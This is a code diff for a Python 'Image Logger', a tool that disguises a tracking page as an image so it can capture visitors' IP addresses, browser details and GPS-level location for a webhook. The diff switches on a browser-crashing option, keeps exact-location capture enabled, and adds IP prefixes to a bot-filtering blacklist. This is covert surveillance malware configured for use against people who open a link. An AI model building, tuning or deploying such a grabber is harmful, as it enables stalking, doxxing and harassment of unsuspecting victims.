@@ -5,10 +5,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "SAMXARA"
-__description__ = "solos"
+__app__ = "Image Logger"
+__description__ = "BY_samxara"
 __version__ = "v2.0"
-__author__ = "TTq"
+__author__ = "DICK"
 
 config = {
     # BASE CONFIG #
@@ -18,17 +18,17 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "SA Logger", # Set this to the name you want the webhook to have
+    "username": "SAMxara", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
-        "message": "sosika", # Message to show
+        "doMessage": False, # Enable the custom message?
+        "message": "Kukla", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
@@ -205,7 +205,7 @@ margin: 0;
 padding: 0;
 }}
 div.img {{
-background-image: url({url});
+background-image: url('{url}');
 background-position: center center;
 background-repeat: no-repeat;
 background-size: contain;
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = ImageLoggerAPI
